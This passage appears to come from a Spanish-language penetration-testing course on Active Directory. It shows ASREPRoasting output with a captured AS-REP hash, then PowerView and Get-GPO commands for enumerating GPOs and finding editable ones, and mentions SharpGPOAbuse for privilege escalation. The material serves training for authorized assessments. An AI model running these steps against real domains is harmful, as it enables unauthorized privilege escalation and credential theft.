[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>
```

Ahora hemos cubierto algunas formas de realizar un ataque ASREPRoasting desde hosts Windows y Linux y hemos visto cómo no necesitamos estar en un host unido al dominio para a) enumerar cuentas que no requieren preautenticación Kerberos y b) realizar este ataque y obtener un AS-REP para descifrarlo offline para obtener un punto de entrada en el dominio o avanzar en nuestro acceso.

---

## Group Policy Object (GPO) Abuse

Group Policy proporciona a los administradores muchas configuraciones avanzadas que se pueden aplicar tanto a objetos de usuario como de computadora en un entorno AD. Group Policy, cuando se usa correctamente, es una excelente herramienta para endurecer un entorno AD configurando configuraciones de usuario, sistemas operativos y aplicaciones. Dicho esto, Group Policy también puede ser abusada por atacantes. Si podemos obtener derechos sobre un Group Policy Object a través de una mala configuración de ACL, podríamos aprovechar esto para movimiento lateral, escalada de privilegios e incluso compromiso de dominio y como un mecanismo de persistencia dentro del dominio. Entender cómo enumerar y atacar GPOs puede darnos una ventaja y, a veces, puede ser la clave para lograr nuestro objetivo en un entorno bastante bloqueado.

Las configuraciones erróneas de GPO se pueden abusar para realizar los siguientes ataques:

- Agregar derechos adicionales a un usuario (como SeDebugPrivilege, SeTakeOwnershipPrivilege o SeImpersonatePrivilege)
- Agregar un usuario administrador local a uno o más hosts
- Crear una tarea programada inmediata para realizar cualquier número de acciones

Podemos enumerar información de GPO usando muchas de las herramientas que hemos estado usando a lo largo de este módulo, como PowerView y BloodHound. También podemos usar [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), entre otros, para auditar la seguridad de los GPOs en un dominio.

Usando la función [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) de PowerView, podemos obtener una lista de GPOs por nombre.

### Enumerating GPO Names with PowerView

```r
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

Esto puede ser útil para comenzar a ver qué tipos de medidas de seguridad están en su lugar (como negar el acceso a cmd.exe y una política de contraseñas separada para cuentas de servicio). Podemos ver que el autologon está en uso, lo que puede significar que hay una contraseña legible en un GPO, y ver que Active Directory Certificate Services (AD CS) está presente en el dominio. Si las herramientas de gestión de Group Policy están instaladas en el host desde el que estamos trabajando, podemos usar varios cmdlets integrados de [GroupPolicy](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) como `Get-GPO` para realizar la misma enumeración.

### Enumerating GPO Names with a Built-In Cmdlet

```r
PS C:\htb> Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access
```

A continuación, podemos verificar si un usuario que podemos controlar tiene algún derecho sobre un GPO. Se pueden otorgar derechos específicos a usuarios o grupos para administrar uno o más GPOs. Una buena primera verificación es ver si el grupo de Domain Users tiene algún derecho sobre uno o más GPOs.

### Enumerating Domain User GPO Rights

```r
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```

Aquí podemos ver que el grupo Domain Users tiene varios permisos sobre un GPO, como `WriteProperty` y `WriteDacl`, que podríamos aprovechar para darnos control total sobre el GPO y realizar cualquiera de los ataques que se empujarían hacia abajo a cualquier usuario y computadora en las OUs a las que se aplica el GPO. Podemos usar el GUID del GPO combinado con `Get-GPO` para ver el nombre de visualización del GPO.

### Converting GPO GUID to Name

```r
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

Al verificar en BloodHound, podemos ver que el grupo `Domain Users` tiene varios derechos sobre el GPO `Disconnect Idle RDP`, que podría aprovecharse para tener control total del objeto.

![image](https://academy.hackthebox.com/storage/modules/143/gporights.png)

Si seleccionamos el GPO en BloodHound y desplazamos hacia abajo hasta `Affected Objects` en la pestaña `Node Info`, podemos ver que este GPO se aplica a una OU, que contiene cuatro objetos de computadora.

![image](https://academy.hackthebox.com/storage/modules/143/gpoaffected.png)

Podríamos usar una herramienta como [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) para aprovechar esta mala configuración de GPO realizando acciones como agregar un usuario que controlamos al grupo de administradores locales en uno de los hosts afectados, crear una tarea programada inmediata en uno de los hosts para darnos un reverse shell, o configurar un script de inicio de computadora malicioso para proporcionarnos un reverse shell o similar. Al usar una herramienta como esta, debemos tener cuidado porque se pueden ejecutar comandos que afectan a todas las computadoras dentro de la OU a la que está vinculado el GPO. Si encontramos un GPO editable que se

 aplica a una OU con 1,000 computadoras, no querríamos cometer el error de agregarnos como administrador local a esa cantidad de hosts. Algunas de las opciones de ataque disponibles con esta herramienta nos permiten especificar un usuario o host objetivo. Los hosts mostrados en la imagen anterior no son explotables, y los ataques a GPO se cubrirán en profundidad en un módulo posterior.

---

## Onwards

Hemos visto varias configuraciones erróneas que podemos encontrar durante una evaluación, y hay muchas más que se cubrirán en módulos avanzados de Active Directory. Vale la pena familiarizarse con la mayor cantidad de ataques posibles, por lo que recomendamos investigar temas como:

- Active Directory Certificate Services (AD CS) attacks
- Kerberos Constrained Delegation
- Kerberos Unconstrained Delegation
- Kerberos Resource-Based Constrained Delegation (RBCD)

En las siguientes secciones, cubriremos brevemente los ataques a trusts de AD. Este es un tema vasto y complicado que se cubrirá en profundidad en un módulo posterior.